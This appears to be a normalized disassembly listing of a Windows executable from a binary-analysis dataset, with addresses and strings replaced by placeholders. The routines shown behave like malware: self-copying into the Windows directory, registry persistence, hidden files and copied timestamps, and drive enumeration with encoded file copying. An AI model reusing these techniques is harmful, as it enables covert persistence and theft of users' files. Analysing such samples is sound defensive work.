sub_401000
mov eax sub_408e5c
call _EH_prolog
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_40109b
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x10
call sub_401937
sub_401055
push esi
xor esi esi
cmp [ esp + 0xc ] esi
jle r-xdata
pop esi
retn
mov eax [ esp + 0x8 ]
lea ecx [ esi + eax ]
mov al [ esi + eax ]
mov dl al
shr dl 0x4
shl al 0x4
add dl al
inc esi
cmp esi [ esp + 0xc ]
mov [ ecx ] dl
jl r-xdata
sub_40109b
mov eax sub_408e68
call _EH_prolog
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0xd
push rw-data
call sub_40107d
push 0xd
push rw-data
call sub_40107d
push 0x19
push rw-data
call sub_40107d
push 0x2d
push rw-data
call sub_40107d
push 0x31
push rw-data
call sub_40107d
push 0x10
push rw-data
call sub_40107d
push 0x12
push rw-data
call sub_40107d
push 0x16
push rw-data
call sub_40107d
add esp 0x40
push 0xd
push rw-data
call sub_40107d
push 0x10
push rw-data
call sub_40107d
push 0x9
pop esi
push esi
push rw-data
call sub_40107d
mov edi rw-data
push 0x16
push edi
call sub_40107d
mov ebx rw-data
push ebx
call strlen
push eax
push ebx
call sub_40107d
add esp 0x2c
mov ebx rw-data
push [ ebx ]
call strlen
push eax
push [ ebx ]
call sub_40107d
add ebx 0x4
add esp 0xc
cmp ebx rw-data
jl r-xdata
mov ebx rw-data
push ebx
call strlen
push eax
push ebx
call sub_40107d
add ebx 0x10
add esp 0xc
cmp ebx rw-data
jl r-xdata
push 0xb
push rw-data
call sub_40107d
push 0xa
push rw-data
call sub_40107d
push 0xc
push rw-data
call sub_40107d
push esi
push rw-data
call sub_40107d
push 0xe
push rw-data
call sub_40107d
push 0xa
push rw-data
call sub_40107d
push esi
push rw-data
call sub_40107d
push esi
push rw-data
call sub_40107d
add esp 0x40
push 0xc
push rw-data
call sub_40107d
pop ecx
mov esi rw-data
pop ecx
push 0x100
push esi
call [ GetWindowsDirectoryA@IAT ]
push esi
push rw-data
call strcpy
push esi
push rw-data
call strcpy
mov ebx rw-data
push esi
push ebx
call strcpy
push esi
push rw-data
call strcpy
push esi
push rw-data
call strcpy
push edi
push ebx
call strcat
push edi
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x40
push edi
push rw-data
call strcat
push rw-data
push rw-data
call strcat
push edi
push rw-data
call strcat
push rw-data
push rw-data
call strcat
push edi
push rw-data
call strcat
push edi
mov edi rw-data
push edi
call strcat
push rw-data
push rw-data
call strcat
push rw-data
push edi
call strcat
add esp 0x40
push 0x0
push ebx
call [ SetFileAttributesA@IAT ]
mov edi [ DeleteFileA@IAT ]
push ebx
call edi
push 0x0
push esi
call [ SetFileAttributesA@IAT ]
push esi
call edi
push 0x0
push rw-data
call [ SetFileAttributesA@IAT ]
push rw-data
call edi
push 0x0
push rw-data
call [ SetFileAttributesA@IAT ]
push rw-data
call edi
push rw-data
call edi
mov edi rw-data
push 0x80
push edi
call [ GetWindowsDirectoryA@IAT ]
push edi
mov edi rw-data
push edi
call strcpy
push rw-data
push edi
call strcat
mov edi rw-data
push rw-data
push edi
call strcpy
push rw-data
push edi
call strcat
push 0x1
call sub_4021e5
mov edi [ CreateEventA@IAT ]
add esp 0x24
xor eax eax
push rw-data
push eax
push eax
push eax
call edi
mov [ rw-data ] eax
xor eax eax
push rw-data
push eax
push eax
push eax
call edi
xor edi edi
mov [ rw-data ] eax
push edi
call sub_40141c
call sub_4015e5
push ebx
call sub_40265a
push ebx
call sub_402bde
push esi
call sub_402bde
push rw-data
call sub_402bde
push rw-data
call sub_402bde
add esp 0x18
call sub_402973
lea eax [ ebp - 0x14 ]
push eax
push edi
push edi
push r-xdata
push edi
push edi
call [ CreateThread@IAT ]
push rw-data
push rw-data
push 0x80000002
call sub_402fae
add esp 0xc
mov [ ebp - 0x4 ] edi
call sub_402bff
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
sub_40141c
push ebp
mov ebp esp
sub esp 0x288
push ebx
xor ebx ebx
push esi
lea eax [ ebp - 0x4 ]
push ebx
push eax
push ebx
push 0x2001f
push ebx
push rw-data
push ebx
push rw-data
push 0x80000002
mov [ ebp - 0x8 ] 0x80
xor esi esi
call [ RegCreateKeyExA@IAT ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
push ebx
push ebx
push rw-data
push [ ebp - 0x4 ]
call [ RegQueryValueExA@IAT ]
cmp eax ebx
jne r-xdata
push edi
lea eax [ ebp - 0x288 ]
push 0x200
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x288 ]
push 0x5c
push eax
call [ strrchr@IAT ]
mov esi eax
inc esi
push esi
push rw-data
call strcpy
mov dl [ esi ]
add esp 0x10
xor edi edi
cmp dl bl
je r-xdata
mov al [ ebp - 0x88 ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0x88 ]
mov [ ebp + edi - 0x88 ] bl
push eax
push 0x1
push ebx
push rw-data
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
pop edi
lea ecx [ ebp - 0x88 ]
mov eax esi
sub ecx esi
cmp [ ebp + 0x8 ] ebx
mov [ esi + rw-data ] bl
je r-xdata
dec al
mov [ esi + rw-data ] al
mov al [ ebp + esi - 0x87 ]
inc esi
jmp r-xdata
inc dl
inc edi
mov [ ecx + eax ] dl
mov dl [ eax + 0x1 ]
inc eax
cmp dl bl
jne r-xdata
pop esi
pop ebx
leave
retn
cmp al bl
je r-xdata
sub_401515
push ebp
mov ebp esp
sub esp 0x204
push esi
lea eax [ ebp - 0x204 ]
push 0x200
push eax
call [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x201 ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x204 ]
push rw-data
push eax
call strcat
add esp 0x20
xor esi esi
lea eax [ ebp - 0x4 ]
push esi
push eax
push esi
push 0x2001f
push esi
push rw-data
push esi
push rw-data
push 0x80000002
call [ RegCreateKeyExA@IAT ]
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call [ RegDeleteValueA@IAT ]
lea eax [ ebp - 0x204 ]
push eax
call strlen
pop ecx
push eax
lea eax [ ebp - 0x204 ]
push eax
push 0x1
push esi
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call [ RegSetValueExA@IAT ]
jmp r-xdata
leave
retn
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x4 ] esi
pop esi
je r-xdata
sub_4015e5
push ebp
mov ebp esp
sub esp 0x710
push ebx
push esi
mov esi rw-data
push edi
xor ebx ebx
push esi
push ebx
push 0x1f0001
call [ OpenMutexA@IAT ]
cmp eax ebx
je r-xdata
push esi
push ebx
push ebx
call [ CreateMutexA@IAT ]
mov esi [ GetWindowsDirectoryA@IAT ]
lea eax [ ebp - 0x210 ]
push 0x200
push eax
call esi
lea eax [ ebp - 0x20d ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x210 ]
push rw-data
push eax
call strcat
mov edi rw-data
lea eax [ ebp - 0x210 ]
push edi
push eax
call strcat
lea eax [ ebp - 0x210 ]
push rw-data
push eax
call strcat
add esp 0x20
lea eax [ ebp - 0x210 ]
push ebx
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x210 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x710 ]
push 0x400
push eax
push ebx
call [ GetModuleFileNameA@IAT ]
mov [ ebp + eax - 0x710 ] bl
lea eax [ ebp - 0x210 ]
push 0x200
push eax
call esi
lea eax [ ebp - 0x20d ]
push rw-data
push eax
call strcpy
mov esi [ CreateDirectoryA@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x210 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x210 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x210 ]
pop ecx
push ebx
push eax
call esi
lea eax [ ebp - 0x210 ]
push edi
push eax
call strcat
mov edi rw-data
lea eax [ ebp - 0x210 ]
push edi
push eax
call strcat
mov esi [ strrchr@IAT ]
lea eax [ ebp - 0x210 ]
push 0x2e
push eax
call esi
mov [ eax ] bl
push 0x2e
lea eax [ ebp - 0x710 ]
push eax
call esi
add esp 0x20
mov [ eax ] bl
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x710 ]
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
push eax
call [ CloseHandle@IAT ]
push [ rw-data ]
call [ SetEvent@IAT ]
push 0x1388
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ Sleep@IAT ]
push ebx
push rw-data
call sub_401515
pop ecx
pop ecx
push 0x1
push edi
call sub_401515
push 0x1
call sub_40141c
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x710 ]
push rw-data
push eax
call strcat
pop ecx
lea eax [ ebp - 0x210 ]
pop ecx
push ebx
push eax
call [ SetFileAttributesA@IAT ]
movsx eax [ ebp - 0x710 ]
push eax
lea eax [ ebp - 0x10 ]
push rw-data
push eax
call [ sprintf@IAT ]
mov esi [ CopyFileA@IAT ]
add esp 0xc
lea eax [ ebp - 0x10 ]
push ebx
push eax
lea eax [ ebp - 0x710 ]
push eax
call esi
lea eax [ ebp - 0x210 ]
push ebx
push eax
lea eax [ ebp - 0x10 ]
push eax
call esi
mov esi [ DeleteFileA@IAT ]
lea eax [ ebp - 0x10 ]
push eax
call esi
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x310 ]
push eax
call strcpy
lea eax [ ebp - 0x310 ]
push rw-data
push eax
call strcat
add esp 0x10
lea eax [ ebp - 0x310 ]
push ebx
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x310 ]
push eax
call esi
lea eax [ ebp - 0x310 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ rename@IAT ]
lea eax [ ebp - 0x210 ]
push eax
call sub_401880
lea eax [ ebp - 0x210 ]
push eax
call sub_402772
add esp 0x10
push 0x1
call [ ExitProcess@IAT ]
sub_401880
push ebp
mov ebp esp
sub esp 0x40c
push ebx
push esi
push edi
lea eax [ ebp - 0x40c ]
push 0x400
push eax
call [ GetWindowsDirectoryA@IAT ]
xor edi edi
mov esi [ CreateFileA@IAT ]
push edi
push 0x2000000
push 0x3
push edi
push 0x5
lea eax [ ebp - 0x40c ]
push 0x80000000
push eax
call esi
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push edi
push 0x80
push 0x3
push edi
push edi
push 0x40000000
push [ ebp + 0x8 ]
call esi
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
push edi
lea eax [ ebp - 0xc ]
push edi
push eax
push [ ebp - 0x4 ]
call [ GetFileTime@IAT ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
push ebx
call [ SetFileTime@IAT ]
push [ ebp - 0x4 ]
mov esi [ CloseHandle@IAT ]
call esi
push ebx
call esi
push [ ebp + 0x8 ]
call [ GetFileAttributesA@IAT ]
or al 0x2
push eax
push [ ebp + 0x8 ]
call [ SetFileAttributesA@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
jmp r-xdata
sub_401937
push ecx
call sub_401965
lea eax [ esp ]
push eax
xor eax eax
push eax
push eax
push sub_40282d
push eax
push eax
call [ CreateThread@IAT ]
call sub_401fa5
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
sub_401965
push ebp
mov ebp esp
sub esp 0x640
push esi
push rw-data
call sub_402bde
mov [ esp ] rw-data
call sub_402bde
push 0x8
lea eax [ ebp - 0x100 ]
push 0x100
push eax
call sub_402e8f
lea eax [ ebp - 0x100 ]
push eax
lea eax [ ebp - 0x640 ]
push eax
call strcpy
lea eax [ ebp - 0x100 ]
push rw-data
push eax
call strcat
add esp 0x20
lea eax [ ebp - 0x240 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
call [ FindFirstFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
pop esi
leave
retn
lea eax [ ebp - 0x640 ]
push eax
lea eax [ ebp - 0x440 ]
push eax
call strcpy
lea eax [ ebp - 0x440 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x440 ]
push eax
call strcat
lea eax [ ebp - 0x440 ]
push eax
call sub_401a3c
add esp 0x1c
lea eax [ ebp - 0x240 ]
push eax
push esi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push esi
call [ FindClose@IAT ]
sub_401a3c
push ebp
mov ebp esp
sub esp 0x550
push edi
xor edi edi
push edi
call [ CoInitialize@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x1
push edi
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
pop edi
leave
retn
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x8 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
push esi
mov esi 0x104
lea eax [ ebp - 0x550 ]
push esi
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push edi
push edi
call [ MultiByteToWideChar@IAT ]
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x550 ]
push edi
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
cmp eax edi
jl r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x148 ]
push 0x2
push edx
mov ecx [ eax ]
lea edx [ ebp - 0x348 ]
push esi
push edx
push eax
call [ ecx + 0xc ]
test eax eax
jl r-xdata
cmp [ ebp - 0x348 ] 0x42
jle r-xdata
mov eax [ ebp - 0x148 ]
and eax 0x10
cmp al 0x10
je r-xdata
lea eax [ ebp - 0x11c ]
push eax
call sub_402b8b
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x348 ]
push eax
push rw-data
call sub_401b25
pop ecx
pop ecx
sub_401b25
push ebp
mov ebp esp
sub esp 0x610
push esi
push 0x5c
push [ ebp + 0xc ]
call [ strrchr@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop esi
leave
retn
push [ ebp + 0x8 ]
lea eax [ ebp - 0x410 ]
push eax
call strcpy
lea eax [ ebp - 0x410 ]
push esi
push eax
call strcat
lea eax [ ebp - 0x410 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call strcpy
add esp 0x18
lea eax [ ebp - 0x210 ]
push 0x0
push eax
push [ ebp + 0xc ]
call [ CopyFileA@IAT ]
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call strcat
lea eax [ ebp - 0x210 ]
push eax
call sub_401d74
mov esi eax
add esp 0xc
cmp esi 0xffffffff
je r-xdata
lea eax [ ebp - 0x210 ]
push eax
call [ DeleteFileA@IAT ]
test esi esi
je r-xdata
mov ecx [ rw-data ]
xor edx edx
div ecx
xor edx edx
mov [ ebp + 0x8 ] eax
mov eax esi
div ecx
test edx edx
je r-xdata
push ecx
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
je r-xdata
inc [ ebp + 0x8 ]
cmp esi [ rw-data ]
push edi
ja r-xdata
mov edi [ fopen@IAT ]
lea eax [ ebp - 0x210 ]
push rw-data
push eax
call edi
pop ecx
mov [ ebp - 0xc ] eax
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x410 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call sub_401e0d
pop ecx
pop ecx
jmp r-xdata
push [ ebp - 0x8 ]
call [ free@IAT ]
pop ecx
lea eax [ ebp - 0x210 ]
push 0x0
push eax
call [ SetFileAttributesA@IAT ]
lea eax [ ebp - 0x210 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x410 ]
push eax
call [ rename@IAT ]
pop ecx
pop ecx
pop edi
jmp r-xdata
push ebx
mov ebx [ fclose@IAT ]
push 0x1
pop eax
cmp [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] eax
jl r-xdata
push [ ebp - 0xc ]
call ebx
pop ecx
pop ebx
push [ ebp - 0x4 ]
lea eax [ ebp - 0x210 ]
push [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x610 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x610 ]
push eax
lea eax [ ebp - 0x410 ]
push eax
call strcpy
lea eax [ ebp - 0x410 ]
push rw-data
push eax
call strcat
push [ ebp - 0xc ]
push [ rw-data ]
push 0x1
push [ ebp - 0x8 ]
call [ fread@IAT ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x610 ]
push rw-data
push eax
call edi
mov esi eax
add esp 0x3c
test esi esi
je r-xdata
push esi
push [ ebp - 0x10 ]
push 0x1
push [ ebp - 0x8 ]
call [ fwrite@IAT ]
push esi
call ebx
lea eax [ ebp - 0x410 ]
push eax
lea eax [ ebp - 0x610 ]
push eax
call sub_401e0d
lea eax [ ebp - 0x410 ]
push eax
push [ ebp + 0xc ]
call sub_402f26
add esp 0x24
lea eax [ ebp - 0x610 ]
push eax
call [ DeleteFileA@IAT ]
lea eax [ ebp - 0x610 ]
push eax
lea eax [ ebp - 0x410 ]
push eax
call [ rename@IAT ]
inc [ ebp - 0x4 ]
pop ecx
mov eax [ ebp - 0x4 ]
pop ecx
cmp eax [ ebp + 0x8 ]
jle r-xdata
sub_401d74
push esi
push edi
xor edi edi
push edi
push 0x80
push 0x3
push edi
push 0x3
push 0x80000000
push [ esp + 0x24 ]
call [ CreateFileA@IAT ]
mov esi eax
or eax 0xffffffff
cmp esi eax
je r-xdata
pop edi
pop esi
retn
push edi
push esi
call [ GetFileSize@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
mov eax edi
sub_401db1
push ebp
mov ebp esp
push ecx
push esi
push rw-data
push [ ebp + 0x8 ]
call [ fopen@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
pop esi
leave
retn
push esi
push 0x4
lea eax [ ebp - 0x4 ]
push 0x1
push eax
call [ fread@IAT ]
push esi
call [ fclose@IAT ]
push [ ebp + 0x8 ]
call sub_401d74
mov ecx eax
add esp 0x18
and ecx 0xff
shl ecx 0x10
shr eax 0x8
or ecx eax
lea eax [ ecx + ecx * 2 ]
xor ecx ecx
cmp [ ebp - 0x4 ] eax
sete cl
mov eax ecx
sub_401e0d
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_401db1
test eax eax
pop ecx
je r-xdata
push esi
call sub_401d74
cmp eax [ rw-data ]
pop ecx
mov [ ebp - 0xc ] eax
ja r-xdata
push 0x0
push [ ebp + 0xc ]
push esi
call [ CopyFileA@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push rw-data
push esi
mov esi [ fopen@IAT ]
call esi
push rw-data
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call esi
add esp 0x10
cmp [ ebp - 0x8 ] 0x0
mov ebx eax
je r-xdata
test ebx ebx
je r-xdata
mov esi [ rw-data ]
and [ ebp - 0x10 ] 0x0
mov [ ebp - 0x14 ] esi
fild [ ebp - 0x14 ]
fmul [ r--data ]
call _ftol
push 0x10
pop edi
push esi
mov esi [ malloc@IAT ]
sub edi eax
call esi
test eax eax
pop ecx
mov [ rw-data ] eax
je r-xdata
push edi
call esi
test eax eax
pop ecx
mov [ rw-data ] eax
je r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push 0x1
push [ rw-data ]
call [ fread@IAT ]
push eax
lea eax [ ebp - 0x4 ]
push [ rw-data ]
push eax
push [ rw-data ]
call sub_403109
add esp 0x20
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
mov esi [ fclose@IAT ]
call esi
push ebx
call esi
push [ rw-data ]
mov esi [ free@IAT ]
call esi
push [ rw-data ]
call esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_402f26
add esp 0x18
push [ ebp - 0x4 ]
push [ rw-data ]
call sub_401f78
mov eax [ ebp - 0x4 ]
mov esi [ fwrite@IAT ]
push ebx
push 0x4
lea ecx [ eax + 0x4 ]
push 0x1
mov eax ecx
and eax 0xff
shl eax 0x10
shr ecx 0x8
or eax ecx
lea eax [ eax + eax * 2 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
call esi
push ebx
push [ ebp - 0x4 ]
push 0x1
push [ rw-data ]
call esi
add esp 0x28
sub_401f78
xor edx edx
cmp [ esp + 0x8 ] edx
jle r-xdata
retn
push ebx
mov eax [ esp + 0x8 ]
lea ecx [ edx + eax ]
mov al [ edx + eax ]
add al dl
mov bl al
shr bl 0x4
shl al 0x4
add bl al
xor bl 0x23
inc edx
cmp edx [ esp + 0xc ]
mov [ ecx ] bl
jl r-xdata
pop ebx
sub_401fa5
push ebp
mov ebp esp
sub esp 0x5e8
and [ ebp - 0x4 ] 0x0
push 0x0
call sub_4021e5
pop ecx
lea eax [ ebp - 0x5e8 ]
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
leave
retn
cmp [ ebp - 0x5e8 ] 0x0
je r-xdata
push ebx
push esi
mov esi [ sprintf@IAT ]
push edi
mov edi rw-data
mov eax [ ebp - 0x20 ]
add [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp + eax - 0x5e8 ] 0x0
jne r-xdata
push eax
call sub_4022e7
test eax eax
pop ecx
je r-xdata
mov eax [ ebp - 0x4 ]
lea ebx [ ebp + eax - 0x5e8 ]
push ebx
call strlen
inc eax
mov [ ebp - 0x20 ] eax
movsx eax [ ebx ]
push eax
call [ toupper@IAT ]
pop ecx
cmp eax 0x43
pop ecx
jl r-xdata
pop edi
pop esi
pop ebx
lea eax [ ebp - 0x68 ]
push 0x40
push eax
xor eax eax
push eax
push eax
push eax
lea eax [ ebp - 0xe8 ]
push 0x80
push eax
push ebx
call [ GetVolumeInformationA@IAT ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
lea eax [ ebp - 0x28 ]
push eax
push ebx
call [ GetDiskFreeSpaceExA@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ GetLocalTime@IAT ]
movzx eax [ ebp - 0x10 ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x14 ]
push eax
movzx eax [ ebp - 0x16 ]
push eax
movzx eax [ ebp - 0x1a ]
push eax
movzx eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x2e8 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x2e8 ]
push eax
push edi
call sub_402e53
add esp 0x28
push 0x0
push 0xf4240
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
call sub_408c50
push eax
push 0x0
push 0xf4240
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
call sub_408c50
push eax
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0xe8 ]
push eax
push ebx
lea eax [ ebp - 0x2e8 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x2e8 ]
push eax
push edi
call sub_402e53
add esp 0x24
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
push rw-data
push ebx
lea eax [ ebp - 0x3e8 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x3e8 ]
push eax
call sub_402313
push rw-data
push ebx
lea eax [ ebp - 0x3e8 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x3e8 ]
push eax
call sub_402313
add esp 0x28
jb r-xdata
movzx eax [ ebp - 0x10 ]
push eax
movzx eax [ ebp - 0x12 ]
push eax
movzx eax [ ebp - 0x14 ]
push eax
movzx eax [ ebp - 0x16 ]
push eax
movzx eax [ ebp - 0x1a ]
push eax
movzx eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x2e8 ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x2e8 ]
push eax
push edi
call sub_402e53
push [ ebp - 0x8 ]
lea eax [ ebp - 0x2e8 ]
push [ ebp - 0xc ]
push ebx
push rw-data
push eax
call esi
lea eax [ ebp - 0x2e8 ]
push eax
push edi
call sub_402e53
add esp 0x44
push rw-data
push edi
call sub_402e53
pop ecx
pop ecx
cmp [ ebp - 0xc ] 0x1e8480
jae r-xdata
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
push ebx
call sub_402313
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x9502f900
jae r-xdata
sub_4021e5
push ebp
mov ebp esp
sub esp 0x210
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
push edi
mov [ ebp - 0x4 ] ebx
jne r-xdata
lea eax [ ebp - 0x210 ]
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
push 0x18
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x210 ] 0x0
je r-xdata
pop edi
pop ebx
leave
retn
xor ecx ecx
push esi
lea esi [ ebp - 0x210 ]
add ecx 0x4
cmp ecx 0x60
jl r-xdata
cmp [ ecx + rw-data ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
cmp [ ebp + eax - 0x210 ] 0x0
mov [ ebp - 0x4 ] eax
lea esi [ ebp + eax - 0x210 ]
jne r-xdata
push esi
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
je r-xdata
cmp [ ecx + rw-data ] ebx
lea eax [ ecx + rw-data ]
je r-xdata
mov [ eax ] ebx
push esi
call strlen
inc eax
mov [ ebp - 0x8 ] eax
movsx eax [ esi ]
push eax
call [ toupper@IAT ]
mov edi eax
pop ecx
cmp edi 0x43
pop ecx
jl r-xdata
pop esi
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax 0x3
jne r-xdata
lea ebx [ edi * 4 + rw-data ]
lea eax [ ebp - 0x10 ]
mov [ ebx ] edi
xor edi edi
push edi
push eax
push edi
push esi
call [ GetDiskFreeSpaceExA@IAT ]
cmp [ ebp - 0xc ] edi
ja r-xdata
mov [ edi * 4 + rw-data ] edi
jmp r-xdata
xor ebx ebx
jb r-xdata
and [ ebx ] 0x0
cmp [ ebp - 0x10 ] 0x3b9aca00
jae r-xdata
sub_4022e7
mov edx [ esp + 0x4 ]
lea eax [ edx * 4 - 0x104 ]
cmp [ eax + rw-data ] 0x0
lea ecx [ eax + rw-data ]
jne r-xdata
xor eax eax
retn
cmp [ eax + rw-data ] 0x0
je r-xdata
push 0x1
mov [ ecx ] edx
pop eax
retn
sub_402313
push esi
push rw-data
call sub_402bde
mov esi rw-data
push esi
call sub_402bde
push 0x5c
push [ esp + 0x14 ]
call [ strrchr@IAT ]
add esp 0x10
test eax eax
je r-xdata
push esi
push [ esp + 0xc ]
call sub_40234d
pop ecx
pop ecx
pop esi
retn
and [ eax ] 0x0
sub_40234d
push ebp
mov ebp esp
sub esp 0xac4
push ebx
push esi
mov esi [ sprintf@IAT ]
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0xac4 ]
push rw-data
push eax
call esi
add esp 0xc
lea eax [ ebp - 0x1c4 ]
push eax
lea eax [ ebp - 0xac4 ]
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x4 ] eax
je r-xdata
push 0x1
pop eax
mov ebx rw-data
mov edi rw-data
lea eax [ ebp - 0x1c4 ]
push eax
push [ ebp - 0x4 ]
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x198 ]
push eax
lea eax [ ebp - 0x4c4 ]
push eax
call strcpy
lea eax [ ebp - 0x4c4 ]
push eax
lea eax [ ebp - 0x3c4 ]
push [ ebp + 0x8 ]
push ebx
push eax
call esi
lea eax [ ebp - 0x4c4 ]
push eax
lea eax [ ebp - 0x8c4 ]
push [ ebp + 0xc ]
push ebx
push eax
call esi
add esp 0x28
test [ ebp - 0x1c4 ] 0x10
je r-xdata
push [ ebp - 0x4 ]
call [ FindClose@IAT ]
jmp r-xdata
lea eax [ ebp - 0x3c4 ]
push eax
lea eax [ ebp - 0x6c4 ]
push eax
call strcpy
pop ecx
lea eax [ ebp - 0x6c4 ]
pop ecx
push eax
call [ CharUpperA@IAT ]
push rw-data
lea eax [ ebp - 0x44 ]
push edi
push eax
call esi
push rw-data
lea eax [ ebp - 0x84 ]
push edi
push eax
call esi
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x6c4 ]
push eax
call [ strstr@IAT ]
add esp 0x20
test eax eax
jne r-xdata
lea eax [ ebp - 0x8c4 ]
push 0x0
push eax
call [ CreateDirectoryA@IAT ]
lea eax [ ebp - 0x8c4 ]
push eax
lea eax [ ebp - 0x3c4 ]
push eax
call sub_40234d
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ ebp - 0x198 ] 0x2e
je r-xdata
lea eax [ ebp - 0x3c4 ]
